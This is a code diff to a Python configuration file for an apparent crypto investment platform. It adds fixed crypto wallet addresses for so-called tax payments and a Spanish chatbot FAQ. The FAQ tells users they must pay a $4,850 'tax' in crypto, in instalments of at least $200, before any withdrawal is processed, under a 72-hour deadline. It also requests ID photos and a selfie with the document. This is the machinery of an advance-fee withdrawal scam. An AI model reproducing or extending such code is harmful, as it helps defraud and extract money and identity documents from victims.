@@ -46,6 +46,74 @@ ADMIN_ACCOUNTS = [
 # Bank transfer restriction
 RESTRICTED_BANK_TRANSFER_EMAILS = ['marinini28@gmail.com']
 
+# App base URL
+APP_BASE_URL = os.environ.get('APP_BASE_URL', 'https://paylionsbit.es')
+
+# Support emails
+SUPPORT_EMAILS = ['info@lionbit.es', 'info@paylionsbit.es']
+
+# Corporate Crypto Wallets (Fixed addresses for tax payments)
+CRYPTO_WALLETS = {
+    'BTC': {
+        'address': '1D8qYgB782ASjwDPwJAafuoTx2TFKFyM89',
+        'network': 'Bitcoin',
+        'name': 'Bitcoin',
+        'icon': 'bitcoin',
+    },
+    'BTC_LEGACY': {
+        'address': '1HXRaffo3SeLBjfD9Du12y8qE9Pod9m2uW',
+        'network': 'Bitcoin (Legacy)',
+        'name': 'Bitcoin (SafePal)',
+        'icon': 'bitcoin',
+    },
+    'ETH': {
+        'address': '0x3ab1d3202a3cd4541093601a16ae3770d33c9f28',
+        'network': 'Ethereum (ERC20)',
+        'name': 'Ethereum',
+        'icon': 'ethereum',
+    },
+    'BNB': {
+        'address': '0x3ab1d3202a3cd4541093601a16ae3770d33c9f28',
+        'network': 'BNB Smart Chain (BEP20)',
+        'name': 'BNB',
+        'icon': 'bnb',
+    },
+    'USDT': {
+        'address': 'TWsDmdfRX2aXmx8ndQy1ijwmDTXJs6NW6p',
+        'network': 'Tron (TRC20)',
+        'name': 'Tether USDT',
+        'icon': 'usdt',
+    },
+}
+
+# Chatbot FAQ
+CHATBOT_FAQ = {
+    'retiro': {
+        'keywords': ['retiro', 'retirar', 'withdraw', 'sacar', 'dinero', 'fondos'],
+        'answer': 'Para solicitar un retiro: 1) Ve a la seccion Withdraw en el menu lateral. 2) Selecciona la cuenta y el monto. 3) Se genera un impuesto obligatorio de $4,850 USD. 4) Paga el impuesto en criptomonedas (pagos parciales minimo $200 USD). 5) El administrador revisara y aprobara tu retiro.'
+    },
+    'impuesto': {
+        'keywords': ['impuesto', 'tax', 'por que pagar', 'pagar impuesto', '4850', '4,850'],
+        'answer': 'El impuesto de $4,850 USD es un requisito obligatorio de cumplimiento fiscal para procesar retiros. Debe ser pagado en criptomonedas. Puede realizar pagos parciales con un minimo de $200 USD por pago.'
+    },
+    'tiempo': {
+        'keywords': ['cuanto tarda', 'tiempo', 'demora', 'cuanto tiempo', 'plazo', 'esperar'],
+        'answer': 'Tiempos de procesamiento: Pago de impuesto: 72 horas maximo. Revision admin: 24-48 horas despues del pago completo. Procesamiento: 1-3 dias habiles despues de aprobacion. Si no se completa el pago del impuesto en 72 horas, el retiro se rechaza automaticamente.'
+    },
+    'minimo': {
+        'keywords': ['minimo', 'pago parcial', 'abono', 'parcial', '200'],
+        'answer': 'El pago minimo por cada abono al impuesto es de $200 USD. Puede realizar multiples pagos parciales hasta completar los $4,850 USD. Todos los pagos deben realizarse en criptomonedas.'
+    },
+    'verificacion': {
+        'keywords': ['verificar', 'verificacion', 'kyc', 'identidad', 'documento', 'selfie'],
+        'answer': 'Para verificar su cuenta (KYC): 1) Vaya a Verification en el menu. 2) Suba la foto frontal del documento. 3) Suba la foto trasera. 4) Tome una selfie sosteniendo su documento. 5) Escriba su nombre legal como firma digital. 6) Acepte los terminos y envie. Revision: 24-48 horas.'
+    },
+    'soporte': {
+        'keywords': ['soporte', 'ayuda', 'contactar', 'problema', 'ticket'],
+        'answer': 'Para contactar soporte: 1) Vaya a Support en el menu. 2) Cree un nuevo ticket. 3) Seleccione la categoria. Nuestro equipo respondera lo antes posible.'
+    }
+}
+
 # MongoDB connection
 mongo_url = os.environ['MONGO_URL']
 client = AsyncIOMotorClient(mongo_url)
